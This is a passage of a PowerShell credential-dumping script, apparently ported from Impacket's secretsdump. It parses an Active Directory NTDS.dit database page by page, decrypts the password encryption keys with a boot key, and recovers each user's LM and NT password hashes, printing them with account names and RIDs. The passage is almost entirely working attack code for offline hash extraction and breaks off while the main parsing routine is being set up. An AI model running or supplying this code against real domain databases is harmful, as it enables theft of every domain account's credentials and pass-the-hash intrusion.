				$ColumnTypeSize[4] = @(4, "Long")
				$ColumnTypeSize[5] = @(8, "QWord")
				$ColumnTypeSize[6] = @(4, "LongSpecial")
				$ColumnTypeSize[7] = @(8, "QWordSpecial")
				$ColumnTypeSize[8] = @(8, "QWord")
				$ColumnTypeSize[9] = $Null
				$ColumnTypeSize[10] = $Null
				$ColumnTypeSize[11] = $Null
				$ColumnTypeSize[12] = $Null
				$ColumnTypeSize[13] = $Null
				$ColumnTypeSize[14] = @(4, "Long")
				$ColumnTypeSize[15] = @(8, "QWord")
				$ColumnTypeSize[16] = @(16, "String16")
				$ColumnTypeSize[17] = @(2, "Short")
				$ColumnTypeSize[18] = $Null

				$UnpackData = $ColumnTypeSize[$ColumnRecord["ColumnType"]]
				If ($UnpackData)
				{
					$UnpackStr = $UnpackData[1]
					Switch ($UnpackStr)
					{
						"Byte" { $Record[$Column] = [byte]($Record[$Column]) }
						"Short" { $Record[$Column] = [BitConverter]::ToUInt16($Record[$Column], 0) }
						"Long" { $Record[$Column] = [BitConverter]::ToUInt32($Record[$Column], 0) }
						"QWord" { $Record[$Column] = [BitConverter]::ToUInt64($Record[$Column], 0) }
						"String16" { $Record[$Column] = [System.Text.Encoding]::ASCII.GetString($Record[$Column]) }
						"LongSpecial" {} # TODO
						"QWordSpecial" {} # TODO
					}
				}
			}
		}
	}

	return $Record
}

function GetNextRow($NTDSContent, $Cursor, $FilterTables, $PageRecordLength, $Version, $Revision, $PageSize)
{
	$Cursor["CurrentTag"] += 1

	# Get next tag
	$PageRecord = $Cursor["CurrentPageRecord"]
	$PageData = $Cursor["CurrentPageData"]
	If ($Cursor["CurrentTag"] -ge $PageRecord["FirstAvailablePageTag"])
	{
		# No more data in this page
		$Tag = $Null
	}
	Else
	{
		$PageFlags, $TagData = GetTag $PageData $PageRecord $Cursor["CurrentTag"] $PageRecordLength $Version $Revision $PageSize
		If (($PageRecord["PageFlags"] -band $FLAGS_LEAF) -gt 0)
		{
			# Leaf Page
			If (($PageRecord["PageFlags"] -band $FLAGS_SPACE_TREE) -gt 0)
			{
				Write-Host "[...] FLAGS_SPACE_TREE exception"
				return $Null
			}
			ElseIf (($PageRecord["PageFlags"] -band $FLAGS_INDEX) -gt 0)
			{
				Write-Host "[...] FLAGS_INDEX exception"
				return $Null
			}
			ElseIf (($PageRecord["PageFlags"] -band $FLAGS_LONG_VALUE) -gt 0)
			{
				Write-Host "[...] FLAGS_LONG_VALUE exception"
				return $Null
			}
			Else
			{
				# Table Value

				# Structure from Impacket "ese.py" : ESENT_LEAF_ENTRY
				$LeafEntry = @{}
				$TAG_COMMON = 4
				$Start = 0
				If (($PageFlags -band $TAG_COMMON) -gt 0)
				{
					# Include the common header
					$LeafEntry["CommonPageKeySize"] = [BitConverter]::ToUInt16($TagData[0..1], 0)
					$Start = 2
				}

				$LeafEntry["LocalPageKeySize"] = [BitConverter]::ToUInt16($TagData[$Start..($Start + 2)], 0)
				$X = $Start + 2
				$Y = $X + $LeafEntry["LocalPageKeySize"]
				$LeafEntry["LocalPageKey"] = $TagData[$X..($Y-1)]
				$X = $Y
				$Y = $TagData.Length
				$LeafEntry["EntryData"] = $TagData[$X..($Y-1)]

				$Tag = $LeafEntry
			}
		}
		Else { $Tag = $Null }
	}

	If (-not $Tag)
	{
		# No more tags in this page, search for the next one on the right
		$PageRecord = $Cursor["CurrentPageRecord"]
		If ($PageRecord["NextPageNumber"] -eq 0)
		{
			# No more pages
			Return $Null
		}
		Else
		{
			$Cursor["CurrentPageData"], $Cursor["CurrentPageRecord"], $PageRecordLength = GetPageRecord $NTDSContent $PageRecord["NextPageNumber"] $Version $Revision $PageSize
			$Cursor["CurrentTag"] = 0
			return (GetNextRow $NTDSContent $Cursor $FilterTables $PageRecordLength $Version $Revision $PageSize)
		}
	}
	Else
	{
		return (TagToRecord $Cursor $Tag["EntryData"] $FilterTables $Version $Revision $PageSize)
	}
}

function GetTag($PageData, $PageRecord, $TagNum, $PageRecordLength, $Version, $Revision, $PageSize)
{
	$Tags = $PageData[($PageData.Length - (4 * $PageRecord["FirstAvailablePageTag"]))..($PageData.Length-1)]
	$BaseOffset = $PageRecordLength

	For ($i = 0; $i -lt $TagNum; $i += 1)
	{
		$Tags = $Tags[0..($Tags.Length - 4 - 1)]
	}
	$Tag = $Tags[($Tags.Length - 4)..($Tags.Length-1)]

	If (($Version -eq 0x620) -and ($Revision -ge 17) -and ($PageSize -gt 8192))
	{
		$ValueSize = [BitConverter]::ToUInt16($Tag[0..1], 0) -band 0x7FFF
		$ValueOffset = [BitConverter]::ToUInt16($Tag[2..3], 0) -band 0x7FFF
		$TMPData = $PageData[($BaseOffset + $ValueOffset)..($BaseOffset + $ValueOffset + $ValueSize - 1)]
		$PageFlags = Shift $TMPData[1] -5
		$TMPData[1] = $TMPData[1] -band 0x1F
		$TagData = $TMPData
	}
	Else
	{
		$ValueSize = [BitConverter]::ToUInt16($Tag[0..1], 0) -band 0x1FFF
		$ValueOffset = [BitConverter]::ToUInt16($Tag[2..3], 0) -band 0x1FFF
		$PageFlags = Shift ([BitConverter]::ToUInt16($Tag[2..3], 0) -band 0xE000) -13
		$TagData = $PageData[($BaseOffset + $ValueOffset)..($BaseOffset + $ValueOffset + $ValueSize - 1)]
	}

	return ($PageFlags, $TagData)
}

function ParsePageRecord($PageData, $PageRecord, $PageRecordLength, $Version, $Revision, $PageSize)
{
	# Iterate over all tags of the page
	For ($TagNum = 1; $TagNum -lt $PageRecord["FirstAvailablePageTag"]; $TagNum += 1)
	{
		# Get page flags and tag data
		$PageFlags, $TagData = GetTag $PageData $PageRecord $TagNum $PageRecordLength $Version $Revision $PageSize
		$FLAGS_LEAF = 2
		$FLAGS_SPACE_TREE = 0x20
		$FLAGS_INDEX = 0x40
		$FLAGS_LONG_VALUE = 0x80

		# If Leaf page
		If (($PageRecord["PageFlags"] -band $FLAGS_LEAF) -gt 0)
		{
			If (($PageRecord["PageFlags"] -band $FLAGS_SPACE_TREE) -gt 0) {}
			ElseIf (($PageRecord["PageFlags"] -band $FLAGS_INDEX) -gt 0) {}
			ElseIf (($PageRecord["PageFlags"] -band $FLAGS_LONG_VALUE) -gt 0) {}
			Else # Table value
			{
				# Parse Leaf entry
				$LeafEntry = @{}

				# Structure from Impacket "ese.py" : ESENT_LEAF_ENTRY
				$TAG_COMMON = 4
				$Start = 0
				If (($PageFlags -band $TAG_COMMON) -gt 0)
				{
					# Include the common header
					$LeafEntry["CommonPageKeySize"] = [BitConverter]::ToUInt16($TagData[0..1], 0)
					$Start = 2
				}

				$LeafEntry["LocalPageKeySize"] = [BitConverter]::ToUInt16($TagData[$Start..($Start + 2)], 0)
				$X = $Start + 2
				$Y = $X + $LeafEntry["LocalPageKeySize"]
				$LeafEntry["LocalPageKey"] = $TagData[$X..($Y-1)]
				$X = $Y
				$Y = $TagData.Length
				$LeafEntry["EntryData"] = $TagData[$X..($Y-1)]

				# Structure from Impacket "ese.py" : ESENT_DATA_DEFINITION_HEADER
				$DataDefinitionHeader = @{}
				$DataDefinitionHeader["LastFixedSize"] = [UInt32]($LeafEntry["EntryData"][0])
				$DataDefinitionHeader["LastVariableDataType"] = [UInt32]($LeafEntry["EntryData"][1])
				$DataDefinitionHeader["VariableSizeOffset"] = [BitConverter]::ToUInt16($LeafEntry["EntryData"][2..3], 0)

				# Structure from Impacket "ese.py" : ESENT_CATALOG_DATA_DEFINITION_ENTRY
				$CatalogEntry = @{}
				$CatalogEntry["FatherPageID"] = [BitConverter]::ToUInt32($LeafEntry["EntryData"][4..7], 0)
				$CatalogEntry["Type"] = [BitConverter]::ToUInt16($LeafEntry["EntryData"][8..9], 0)
				$CatalogEntry["Identifier"] = [BitConverter]::ToUInt32($LeafEntry["EntryData"][10..13], 0)

				$CATALOG_TYPE_TABLE = 1
				$CATALOG_TYPE_COLUMN = 2
				$CATALOG_TYPE_INDEX = 3
				$CATALOG_TYPE_LONG_VALUE = 4
				$CATALOG_TYPE_CALLBACK = 5
				If ($CatalogEntry["Type"] -eq $CATALOG_TYPE_TABLE)
				{
					$CatalogEntry["FatherDataPageNumber"] = [BitConverter]::ToUInt32($LeafEntry["EntryData"][14..17], 0)
					$CatalogEntry["SpaceUsage"] = [BitConverter]::ToUInt32($LeafEntry["EntryData"][18..21], 0)
					$CatalogEntry["Trailing"] = $LeafEntry["EntryData"][22..($LeafEntry["EntryData"].Length-1)]
				}
				ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_COLUMN)
				{
					$CatalogEntry["ColumnType"] = [BitConverter]::ToUInt32($LeafEntry["EntryData"][14..17], 0)
					$CatalogEntry["SpaceUsage"] = [BitConverter]::ToUInt32($LeafEntry["EntryData"][18..21], 0)
					$CatalogEntry["ColumnFlags"] = [BitConverter]::ToUInt32($LeafEntry["EntryData"][22..25], 0)
					$CatalogEntry["CodePage"] = [BitConverter]::ToUInt32($LeafEntry["EntryData"][26..29], 0)
					$CatalogEntry["Trailing"] = $LeafEntry["EntryData"][22..($LeafEntry["EntryData"].Length-1)]
				}
				ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_INDEX)
				{
					$CatalogEntry["FatherDataPageNumber"] = [BitConverter]::ToUInt32($LeafEntry["EntryData"][14..17], 0)
					$CatalogEntry["SpaceUsage"] = [BitConverter]::ToUInt32($LeafEntry["EntryData"][18..21], 0)
					$CatalogEntry["IndexFlags"] = [BitConverter]::ToUInt32($LeafEntry["EntryData"][22..25], 0)
					$CatalogEntry["Locale"] = [BitConverter]::ToUInt32($LeafEntry["EntryData"][26..29], 0)
					$CatalogEntry["Trailing"] = $LeafEntry["EntryData"][22..($LeafEntry["EntryData"].Length-1)]
				}
				ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_LONG_VALUE)
				{
					$CatalogEntry["FatherDataPageNumber"] = [BitConverter]::ToUInt32($LeafEntry["EntryData"][14..17], 0)
					$CatalogEntry["SpaceUsage"] = [BitConverter]::ToUInt32($LeafEntry["EntryData"][18..21], 0)
					$CatalogEntry["Trailing"] = $LeafEntry["EntryData"][22..($LeafEntry["EntryData"].Length-1)]
				}
				ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_CALLBACK) { Write-Host "[...] Callback type not supported"; Break }
				Else { Write-Host ("[...] Unknown catalog type 0x{0:X2}" -f ($CatalogEntry["DataType"])); Break }

				# Parse item name
				If ($DataDefinitionHeader["LastVariableDataType"] -gt 127) { $NumEntries = $DataDefinitionHeader["LastVariableDataType"] - 127 }
				Else { $NumEntries = $DataDefinitionHeader["LastVariableDataType"] }

				$ItemLen = [BitConverter]::ToUInt16($LeafEntry["EntryData"][$DataDefinitionHeader["VariableSizeOffset"]..($DataDefinitionHeader["VariableSizeOffset"]+1)], 0)
				$ItemName = [System.Text.Encoding]::ASCII.GetString($LeafEntry["EntryData"][($DataDefinitionHeader["VariableSizeOffset"] + (2 * $NumEntries))..(($DataDefinitionHeader["VariableSizeOffset"] + (2 * $NumEntries)) + $ItemLen - 1)])

				If ($CatalogEntry["Type"] -eq $CATALOG_TYPE_TABLE)
				{
					$Global:PageTables[$ItemName] = @{}
					$Global:PageTables[$ItemName]["TableEntry"] = $LeafEntry
					$Global:PageTables[$ItemName]["Columns"] = @{}
					$Global:PageTables[$ItemName]["Indexes"] = @{}
					$Global:PageTables[$ItemName]["LongValues"] = @{}
					$Global:CurrentTable = $ItemName
				}
				ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_COLUMN)
				{
					$Global:PageTables[$Global:CurrentTable]["Columns"][$ItemName] = $LeafEntry
					$Global:PageTables[$Global:CurrentTable]["Columns"][$ItemName]["Header"] = $DataDefinitionHeader
					$Global:PageTables[$Global:CurrentTable]["Columns"][$ItemName]["Record"] = $CatalogEntry
				}
				ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_INDEX)
				{
					$Global:PageTables[$Global:CurrentTable]["Indexes"][$ItemName] = $LeafEntry
				}
				ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_LONG_VALUE)
				{
					$lvLen = [BitConverter]::ToUInt16($LeafEntry["EntryData"][$DataDefinitionHeader["VariableSizeOffset"]..($DataDefinitionHeader["VariableSizeOffset"]+1)], 0)
					$lvName = [System.Text.Encoding]::ASCII.GetString($LeafEntry["EntryData"][($DataDefinitionHeader["VariableSizeOffset"] + 7)..($DataDefinitionHeader["VariableSizeOffset"] + 7 + $lvLen - 1)])
					$Global:PageTables[$Global:CurrentTable]["LongValues"][$lvName] = $LeafEntry
				}
				Else { Write-Host ("[...] Unknown type 0x{0:X2}" -f ($CatalogEntry["Type"])); Break }
			}
		}
	}
}

function GetPageRecord($NTDSContent, $PageNum, $Version, $Revision, $PageSize)
{
	$Start = ($PageNum + 1) * $PageSize
	$End = $Start + $PageSize
	# Write-Host ("Trying to fetch page {0} (0x{1:X2})" -f ($PageNum, $Start))

	$PageData = $NTDSContent[$Start..($End-1)]

	# Structure from Impacket "ese.py" : ESENT_PAGE_HEADER
	$PageRecord = @{}
	$PageRecordLength = 0

	# Get records headers from page
	If (($Version -lt 0x620) -or (($Version -eq 0x620) -and ($Revision -lt 0x0B)))
	{
		# Old format
		$PageRecord["CheckSum"] = [BitConverter]::ToUInt32($PageData[0..3], 0)
		$PageRecord["PageNumber"] = [BitConverter]::ToUInt32($PageData[4..7], 0)

		$PageRecord["LastModificationTime"] = [BitConverter]::ToUInt64($PageData[8..15], 0)
		$PageRecord["PreviousPageNumber"] = [BitConverter]::ToUInt32($PageData[16..19], 0)
		$PageRecord["NextPageNumber"] = [BitConverter]::ToUInt32($PageData[20..23], 0)
		$PageRecord["FatherDataPage"] = [BitConverter]::ToUInt32($PageData[24..27], 0)
		$PageRecord["AvailableDataSize"] = [BitConverter]::ToUInt16($PageData[28..29], 0)
		$PageRecord["AvailableUncommittedDataSize"] = [BitConverter]::ToUInt16($PageData[30..31], 0)
		$PageRecord["FirstAvailableDataOffset"] = [BitConverter]::ToUInt16($PageData[32..33], 0)
		$PageRecord["FirstAvailablePageTag"] = [BitConverter]::ToUInt16($PageData[34..35], 0)
		$PageRecord["PageFlags"] = [BitConverter]::ToUInt32($PageData[36..39], 0)

		$PageRecordLength = 40
	}
	ElseIf (($Version -eq 0x620) -and ($Revision -lt 0x11))
	{
		# Exchange 2003 SP1 and Windows Vista and later
		$PageRecord["CheckSum"] = [BitConverter]::ToUInt32($PageData[0..3], 0)
		$PageRecord["ECCCheckSum"] = [BitConverter]::ToUInt32($PageData[4..7], 0)

		$PageRecord["LastModificationTime"] = [BitConverter]::ToUInt64($PageData[8..15], 0)
		$PageRecord["PreviousPageNumber"] = [BitConverter]::ToUInt32($PageData[16..19], 0)
		$PageRecord["NextPageNumber"] = [BitConverter]::ToUInt32($PageData[20..23], 0)
		$PageRecord["FatherDataPage"] = [BitConverter]::ToUInt32($PageData[24..27], 0)
		$PageRecord["AvailableDataSize"] = [BitConverter]::ToUInt16($PageData[28..29], 0)
		$PageRecord["AvailableUncommittedDataSize"] = [BitConverter]::ToUInt16($PageData[30..31], 0)
		$PageRecord["FirstAvailableDataOffset"] = [BitConverter]::ToUInt16($PageData[32..33], 0)
		$PageRecord["FirstAvailablePageTag"] = [BitConverter]::ToUInt16($PageData[34..35], 0)
		$PageRecord["PageFlags"] = [BitConverter]::ToUInt32($PageData[36..39], 0)

		$PageRecordLength = 40
	}
	Else
	{
		# >= Windows 7
		$PageRecord["CheckSum"] = [BitConverter]::ToUInt64($PageData[0..7], 0)

		$PageRecord["LastModificationTime"] = [BitConverter]::ToUInt64($PageData[8..15], 0)
		$PageRecord["PreviousPageNumber"] = [BitConverter]::ToUInt32($PageData[16..19], 0)
		$PageRecord["NextPageNumber"] = [BitConverter]::ToUInt32($PageData[20..23], 0)
		$PageRecord["FatherDataPage"] = [BitConverter]::ToUInt32($PageData[24..27], 0)
		$PageRecord["AvailableDataSize"] = [BitConverter]::ToUInt16($PageData[28..29], 0)
		$PageRecord["AvailableUncommittedDataSize"] = [BitConverter]::ToUInt16($PageData[30..31], 0)
		$PageRecord["FirstAvailableDataOffset"] = [BitConverter]::ToUInt16($PageData[32..33], 0)
		$PageRecord["FirstAvailablePageTag"] = [BitConverter]::ToUInt16($PageData[34..35], 0)
		$PageRecord["PageFlags"] = [BitConverter]::ToUInt32($PageData[36..39], 0)

		$PageRecordLength = 40

		If ($PageSize -gt 8192)
		{
			$PageRecord["ExtendedCheckSum1"] = [BitConverter]::ToUInt64($PageData[40..47], 0)
			$PageRecord["ExtendedCheckSum1"] = [BitConverter]::ToUInt64($PageData[48..45], 0)
			$PageRecord["ExtendedCheckSum1"] = [BitConverter]::ToUInt64($PageData[46..53], 0)
			$PageRecord["PageNumber"] = [BitConverter]::ToUInt64($PageData[54..61], 0)
			$PageRecord["Unknown"] = [BitConverter]::ToUInt64($PageData[62..69], 0)

			$PageRecordLength += 30
		}
	}

	return ($PageData, $PageRecord, $PageRecordLength)
}

function ParseCatalog($NTDSContent, $PageNum, $Version, $Revision, $PageSize)
{
	$PageData, $PageRecord, $PageRecordLength = GetPageRecord $NTDSContent $PageNum $Version $Revision $PageSize
	ParsePageRecord $PageData $PageRecord $PageRecordLength $Version $Revision $PageSize

	For ($i = 1; $i -lt $PageRecord["FirstAvailablePageTag"]; $i += 1)
	{
		$PageFlags, $TagData = GetTag $PageData $PageRecord $i $PageRecordLength $Version $Revision $PageSize
		$FLAGS_LEAF = 2
		If (($PageRecord["PageFlags"] -band $FLAGS_LEAF) -eq 0)
		{
			# Branch page

			# Structure from Impacket "ese.py" : ESENT_BRANCH_ENTRY
			$TAG_COMMON = 4
			$Start = 0
			If (($PageFlags -band $TAG_COMMON) -gt 0)
			{
				# Include the common header
				$CommonPageKeySize = [BitConverter]::ToUInt16($TagData[0..1], 0)
				$Start = 2
			}

			$LocalPageKeySize = [BitConverter]::ToUInt16($TagData[$Start..($Start + 2)], 0)
			$X = $Start + 2
			$Y = $X + $LocalPageKeySize
			$LocalPageKey = $TagData[$X..($Y-1)]
			$X = $Y
			$Y = $X + 4
			$ChildPageNumber = [BitConverter]::ToUInt32($TagData[$X..($Y-1)], 0)
			ParseCatalog $NTDSContent $ChildPageNumber $Version $Revision $PageSize
		}
	}
}

function PrintCatalog()
{
	ForEach ($Table in ($Global:PageTables).Keys)
	{
		Write-Host ("[{0}]" -f ($Table))
		$CurrentTable = ($Global:PageTables)[$Table]

		Write-Host ("`tColumns")
		ForEach ($Column in ($CurrentTable["Columns"]).Keys)
		{
			$CurrentColumnRecord = $CurrentTable["Columns"][$Column]["Record"]
			Write-Host ("`t`t{0}`t{1}`t{2}" -f ($CurrentColumnRecord["Identifier"], $Column, $CurrentColumnRecord["ColumnType"]))
		}

		Write-Host ("`tIndexes")
		ForEach ($Index in ($CurrentTable["Indexes"]).Keys)
		{
			Write-Host ("`t`t{0}" -f ($Index))
		}
	}
}

function DecryptUserRecord($UserRecord, $PEKs)
{
	<#
		DecryptUserRecord:
			- UserName = UserRecord[NameToInternal["name"]]
			- RID = Derivation of UserRecord[NameToInternal["objectSid"]]
			- ObfLMHash = UserRecord[NameToInternal["dBCSPwd"]]
				- Header = UserRecord[NameToInternal["dBCSPwd"]][0..7]
				- KeyMaterial = UserRecord[NameToInternal["dBCSPwd"]][8..23]
				- EncHash = UserRecord[NameToInternal["dBCSPwd"]][24..(UserRecord[NameToInternal["dBCSPwd"]].Length-1)]
				- If (ObfLMHash[0..3] == [0x13,0,0,0]) # Win2016 TP4
					- Header = UserRecord[NameToInternal["dBCSPwd"]][0..7]
					- KeyMaterial = UserRecord[NameToInternal["dBCSPwd"]][8..23]
					- EncHash = UserRecord[NameToInternal["dBCSPwd"]][28..(UserRecord[NameToInternal["dBCSPwd"]].Length-1)]
					- pekIndex = [UInt16](([System.BitConverter]::ToString(Header).Replace("-", "")).Substring(8,2))
					- TMPLMHash = AESDecrypt PEKs[pekIndex] EncHash[0..15] KeyMaterial
				- Else
					- pekIndex = [UInt16](([System.BitConverter]::ToString(Header).Replace("-", "")).Substring(8,2))
					- TMPKey = MD5 (PEKs[pekIndex] + KeyMaterial)
					- TMPLMHash = RC4 (TMPKey, EncHash)
				- DESKeys = RIDToDESKeys (RID)
				- LMHash = DESDecrypt (DESKeys[0], TMPLMHash[0..7], DESKeys[0]) + DESDecrypt (DESKeys[1], TMPLMHash[8..(TMPLMHash.Length - 1)], DESKeys[1])
			- ObfNTHash = UserRecord[NameToInternal["unicodePwd"]]
				- Obtain NTHash with same process as LMHash
			- Domain = UserRecord[NameToInternal["userPrincipalName"]].Split("@")[-1]
			- AccountName = UserRecord[NameToInternal["sAMAccountName"]]
			- AccountStatus = ToBinary (ToUInt32 (UserRecord[NameToInternal["sAMAccountName"]]))[-2:-1] (1 = Disabled, 0 = Enabled)
	#>

	$UserInfo = @{}

	# Structure from Impacket "secretsdump.py" : NAME_TO_INTERNAL
	$NameToInternal = @{}
	$NameToInternal["uSNCreated"] = "ATTq131091"
	$NameToInternal["uSNChanged"] = "ATTq131192"
	$NameToInternal["name"] = "ATTm3"
	$NameToInternal["objectGUID"] = "ATTk589826"
	$NameToInternal["objectSid"] = "ATTr589970"
	$NameToInternal["userAccountControl"] = "ATTj589832"
	$NameToInternal["primaryGroupID"] = "ATTj589922"
	$NameToInternal["accountExpires"] = "ATTq589983"
	$NameToInternal["logonCount"] = "ATTj589993"
	$NameToInternal["sAMAccountName"] = "ATTm590045"
	$NameToInternal["sAMAccountType"] = "ATTj590126"
	$NameToInternal["lastLogonTimestamp"] = "ATTq589876"
	$NameToInternal["userPrincipalName"] = "ATTm590480"
	$NameToInternal["unicodePwd"] = "ATTk589914"
	$NameToInternal["dBCSPwd"] = "ATTk589879"
	$NameToInternal["ntPwdHistory"] = "ATTk589918"
	$NameToInternal["lmPwdHistory"] = "ATTk589984"
	$NameToInternal["pekList"] = "ATTk590689"
	$NameToInternal["supplementalCredentials"] = "ATTk589949"
	$NameToInternal["pwdLastSet"] = "ATTq589920"

	# Get user name
	$UserName = $UserRecord[$NameToInternal["name"]]
	$UserInfo["UserName"] = $UserName

	# Get SID
	$ObjectSID = $UserRecord[$NameToInternal["objectSid"]]
	# Structure from Impacket "secretsdump.py" : SAM_RPC_SID
	$Revision = $ObjectSID[0]
	$SubAuthorityCount = [UInt32]($ObjectSID[1])
	$IdentifierAuthority = $ObjectSID[2..7]
	$SubLen = $SubAuthorityCount * 4
	$SubAuthority = $ObjectSID[8..(8 + $SubLen - 1)]
	$SID = "S-" + $Revision + "-" + $IdentifierAuthority[5]
	For ($i = 0; $i -lt $SubAuthorityCount; $i += 1)
	{
		$Tab = $SubAuthority[($i*4)..(($i*4)+4-1)]
		[Array]::Reverse($Tab)
		$SID += "-" + [BitConverter]::ToUInt32($Tab, 0)
	}

	# Get RID
	$RID = $SID.Split("-")
	$RID = [UInt32]($RID[$RID.Length-1])
	$UserInfo["RID"] = $RID

	$emptyLM = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee);
	$emptyNT = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0);

	# Get LM Hash if defined
	$LMHash = $emptyLM
	If ($UserRecord[$NameToInternal["dBCSPwd"]])
	{
		# Structure from Impacket "secretsdump.py" : CRYPTED_HASH
		$Header = $UserRecord[$NameToInternal["dBCSPwd"]][0..7]
		$KeyMaterial = $UserRecord[$NameToInternal["dBCSPwd"]][8..23]
		$EncHash = $UserRecord[$NameToInternal["dBCSPwd"]][24..39]

		If (@(Compare-Object $Header[0..3] @([Int]0x13, [Int]0x00, [Int]0x00, [Int]0x00) -SyncWindow 0).Length -eq 0)
		{
			# Win2016 TP4 decryption is different
			# Structure from Impacket "secretsdump.py" : CRYPTED_HASHW16
			$Header = $UserRecord[$NameToInternal["dBCSPwd"]][0..7]
			$KeyMaterial = $UserRecord[$NameToInternal["dBCSPwd"]][8..23]
			$Unknown = $UserRecord[$NameToInternal["dBCSPwd"]][24..27]
			$EncHash = $UserRecord[$NameToInternal["dBCSPwd"]][28..($UserRecord[$NameToInternal["dBCSPwd"]].Length-1)]

			$pekIndex = [UInt16](([System.BitConverter]::ToString($Header).Replace("-", "")).Substring(8,2))
			$TMPLMHash = AESTransform $PEKs[$pekIndex] $EncHash[0..15] $KeyMaterial ([Security.Cryptography.CipherMode]::CBC) $False
		}
		Else
		{
			$MD5 = [System.Security.Cryptography.MD5]::Create()
			$pekIndex = [UInt16](([System.BitConverter]::ToString($Header).Replace("-", "")).Substring(8,2))
			$Update = $PEKs[$pekIndex]
			$Update += $KeyMaterial
			$TMPKey = $MD5.ComputeHash($Update)

			$TMPLMHash = (NewRC4 $TMPKey).Transform($EncHash)
		}

		$DESKeys = RIDToDESKeys($RID)
		$LMHash = (DESTransform $DESKeys[0] $TMPLMHash[0..7] $DESKeys[0] $False) + (DESTransform $DESKeys[1] $TMPLMHash[8..$($TMPLMHash.Length - 1)] $DESKeys[1] $False)
	}
	$UserInfo["LMHash"] = $LMHash

	# Get NT Hash if defined
	$NTHash = $emptyNT
	If ($UserRecord[$NameToInternal["unicodePwd"]])
	{
		# Structure from Impacket "secretsdump.py" : CRYPTED_HASH
		$Header = $UserRecord[$NameToInternal["unicodePwd"]][0..7]
		$KeyMaterial = $UserRecord[$NameToInternal["unicodePwd"]][8..23]
		$EncHash = $UserRecord[$NameToInternal["unicodePwd"]][24..39]

		If (@(Compare-Object $Header[0..3] @([Int]0x13, [Int]0x00, [Int]0x00, [Int]0x00) -SyncWindow 0).Length -eq 0)
		{
			# Win2016 TP4 decryption is different
			# Structure from Impacket "secretsdump.py" : CRYPTED_HASHW16
			$Header = $UserRecord[$NameToInternal["unicodePwd"]][0..7]
			$KeyMaterial = $UserRecord[$NameToInternal["unicodePwd"]][8..23]
			$Unknown = $UserRecord[$NameToInternal["unicodePwd"]][24..27]
			$EncHash = $UserRecord[$NameToInternal["unicodePwd"]][28..($UserRecord[$NameToInternal["unicodePwd"]].Length-1)]

			$pekIndex = [UInt16](([System.BitConverter]::ToString($Header).Replace("-", "")).Substring(8,2))
			$TMPNTHash = AESTransform $PEKs[$pekIndex] $EncHash[0..15] $KeyMaterial ([Security.Cryptography.CipherMode]::CBC) $False
		}
		Else
		{
			$MD5 = [System.Security.Cryptography.MD5]::Create()
			$pekIndex = [UInt16](([System.BitConverter]::ToString($Header).Replace("-", "")).Substring(8,2))
			$Update = $PEKs[$pekIndex]
			$Update += $KeyMaterial
			$TMPKey = $MD5.ComputeHash($Update)

			$TMPNTHash = (NewRC4 $TMPKey).Transform($EncHash)
		}

		$DESKeys = RIDToDESKeys($RID)
		$NTHash = (DESTransform $DESKeys[0] $TMPNTHash[0..7] $DESKeys[0] $False) + (DESTransform $DESKeys[1] $TMPNTHash[8..$($TMPNTHash.Length - 1)] $DESKeys[1] $False)
	}
	$UserInfo["NTHash"] = $NTHash

	# Get potential domain
	If ($UserRecord[$NameToInternal["userPrincipalName"]])
	{
		$X = $UserRecord[$NameToInternal["userPrincipalName"]].Split("@")
		$Domain = $X[$X.Length-1]
	}

	# Get account name
	If ($UserRecord[$NameToInternal["sAMAccountName"]])
	{
		$AccountName = $UserRecord[$NameToInternal["sAMAccountName"]]
		If ($Domain)
		{
			$AccountName = $Domain + "\" + $AccountName
		}
	}
	$UserInfo["AccountName"] = $AccountName

	# Get user account status (enabled/disabled)
	$AccountStatus = "N/A"
	if ($UserRecord[$NameToInternal["userAccountControl"]])
	{
		$X = [System.Convert]::ToString([BitConverter]::ToUInt32($UserRecord[$NameToInternal["userAccountControl"]], 0), 2).PadLeft(8, '0')
		$Bit = $X.Substring($X.Length-2, 1)
		If ($Bit -eq "1")
		{
			$AccountStatus = "Disabled"
		}
		Else
		{
			$AccountStatus = "Enabled"
		}
	}
	$UserInfo["AccountStatus"] = $AccountStatus

	Write-Host ("[...] {0}:{1}:{2}:{3}:{4}" -f ($AccountStatus, $AccountName, $RID, [System.BitConverter]::ToString($LMHash).Replace("-", ""), [System.BitConverter]::ToString($NTHash).Replace("-", "")))

	# TODO: __decryptSupplementalInfo(self, record, prefixTable=None, keysFile=None, clearTextFile=None)

	return $UserInfo
}

function ParseNTDS($NTDSPath, $BootKey)
{
	<#
		ParseNTDS:
			1- Extract headers from NTDS at page 1
			2- Parse DB starting at page 4
			3- Open page table "datatable" and position a cursor at the leaf levels for fast reading
			4- Search PEKList into page table "datatable" (we may found user account record while searching, store them for later processing)
			5- Decrypt the PEKList if founded with BootKey and store PEK Keys
				- KeyMaterial = EncPEKListData[8..23]
				- EncPEKList = EncPEKListData[24..(EncPEKListData.Length-1)]
				5.1- If (EncPEKListData[0..3] == [2,0,0,0]) # Up to Windows 2012 R2
					- Update = BootKey
					- For i in range (1000) { Update += KeyMaterial }
					- Key = MD5 (Update)
					- PEKs into RC4 (Key, EncPEKList)
				5.2- Elif (EncPEKListData[0..3] == [3,0,0,0]) # Windows 2016 TP4 and up
					- PEKs into AESDecrypt (Key = BootKey, CipherText = EncPEKList, IV = KeyMaterial)
			6- Now we have PEK Keys, Let decrypt each user record
				- Starting from users already cached when searching Encrypted PEKList
				- Then search other users into NTDS after Encrypted PEKList and decrypt LM/NT hashes
	#>

	$NTDSContent = [System.IO.File]::ReadAllBytes($NTDSPath)
	$MaxPageSize = 8192

	# 1- Extract headers from NTDS at page 1
	Write-Host ("[+] Reading NTDS headers at page 1")
	$MainHeader = $NTDSContent[0..($MaxPageSize-1)]

	# Structure from Impacket "ese.py" : ESENT_DB_HEADER
